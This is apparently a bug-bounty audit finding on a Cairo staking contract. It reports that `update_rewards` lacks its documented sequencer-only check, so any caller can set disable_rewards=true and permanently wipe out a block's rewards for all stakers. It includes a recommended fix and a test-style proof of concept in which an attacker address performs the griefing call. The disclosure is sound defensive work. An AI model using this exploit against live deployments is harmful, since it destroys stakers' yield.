### Title
Missing Access Control on `update_rewards` Allows Any Caller to Permanently Suppress Per-Block Reward Distribution — (`src/staking/staking.cairo`)

---

### Summary

`IStakingRewardsManager::update_rewards` is documented as restricted to "Only starkware sequencer" but the implementation contains **no caller check**. Any unprivileged address can call it with `disable_rewards=true`, causing `last_reward_block` to be advanced to the current block without distributing rewards. All subsequent legitimate calls for that block revert with `REWARDS_ALREADY_UPDATED`, permanently destroying that block's accrued yield for the targeted staker(s).

---

### Finding Description

The spec at `docs/spec.md:1644–1645` states:

> **access control**: Only starkware sequencer.

The production implementation at `src/staking/staking.cairo:1449–1507` enforces no such restriction:

```cairo
fn update_rewards(
    ref self: ContractState, staker_address: ContractAddress, disable_rewards: bool,
) {
    self.general_prerequisites();          // only checks pause flag
    let current_block_number = starknet::get_block_number();
    assert!(
        current_block_number > self.last_reward_block.read(),
        "{}", Error::REWARDS_ALREADY_UPDATED,
    );
    // ... staker existence / activity checks ...
    self.last_reward_block.write(current_block_number);   // ← written before reward gate
    if disable_rewards || self.is_pre_consensus() {
        return;                                            // ← exits with no rewards
    }
    // ... actual reward distribution ...
}
``` [1](#0-0) 

`general_prerequisites()` only checks the pause flag — there is no `get_caller_address()` comparison against a sequencer address anywhere in the function or in the file (grep for `sequencer` returns zero matches in `staking.cairo`).

`last_reward_block` is a single global storage slot. Once written to the current block number, the guard `current_block_number > self.last_reward_block.read()` will fail for every subsequent call in the same block, regardless of which staker is targeted. [2](#0-1) 

The interface definition confirms the function is publicly exposed: [3](#0-2) 

---

### Impact Explanation

- An attacker calls `update_rewards(any_active_staker, disable_rewards=true)` from any EOA.
- `last_reward_block` is set to the current block; no rewards are distributed.
- Every legitimate call for that block (e.g., from the sequencer) reverts with `REWARDS_ALREADY_UPDATED`.
- The block's rewards are **permanently lost** — blocks are never replayed, so the skipped yield can never be recovered.
- Because `last_reward_block` is global, a single call suppresses rewards for **all** stakers for that block.

This constitutes **permanent freezing of unclaimed yield** — a High-severity impact under the allowed scope.

---

### Likelihood Explanation

- No special role, token balance, or prior state is required.
- The attacker only needs to know any currently active staker address (all staker addresses are discoverable on-chain via `get_stakers`).
- The attack can be repeated every block at negligible cost.
- Likelihood: **High**.

---

### Recommendation

Add a sequencer-only guard at the top of `update_rewards`, consistent with the spec. For example:

```cairo
fn update_rewards(
    ref self: ContractState, staker_address: ContractAddress, disable_rewards: bool,
) {
    self.general_prerequisites();
    assert!(
        starknet::get_caller_address() == self.sequencer_address.read(),
        "{}", Error::CALLER_IS_NOT_SEQUENCER,
    );
    // ... rest of function
}
```

Alternatively, if the sequencer address is not stored, restrict to the contract's own address or use an existing role (e.g., `app_governor` or a dedicated `sequencer` role stored in config).

### Proof of Concept

```cairo
#[test]
fn test_unprivileged_disable_rewards_griefing() {
    // Setup: deploy system, stake, advance K epochs so staker is active
    let mut cfg: StakingInitConfig = Default::default();
    general_contract_system_deployment(ref :cfg);
    stake_for_testing_using_dispatcher(:cfg);
    advance_k_epochs_global();
    // Set consensus rewards active
    let staking_contract = cfg.test_info.staking_contract;
    let staker_address = cfg.test_info.staker_address;
    let rewards_dispatcher = IStakingRewardsManagerDispatcher {
        contract_address: staking_contract,
    };
    let staking_dispatcher = IStakingDispatcher { contract_address: staking_contract };

    let info_before = staking_dispatcher.staker_info_v1(staker_address);

    // Attacker (arbitrary address) calls update_rewards with disable_rewards=true
    let attacker = contract_address_const::<'attacker'>();
    cheat_caller_address_once(contract_address: staking_contract, caller_address: attacker);
    rewards_dispatcher.update_rewards(staker_address, disable_rewards: true);

    // Legitimate sequencer call for the same block now reverts
    let safe = IStakingRewardsManagerSafeDispatcher { contract_address: staking_contract };
    let result = safe.update_rewards(staker_address, disable_rewards: false);
    assert_panic_with_error(result, StakingError::REWARDS_ALREADY_UPDATED.describe());

    // Staker's unclaimed_rewards_own is unchanged — block rewards permanently lost
    let info_after = staking_dispatcher.staker_info_v1(staker_address);
    assert!(info_after.unclaimed_rewards_own == info_before.unclaimed_rewards_own);
}
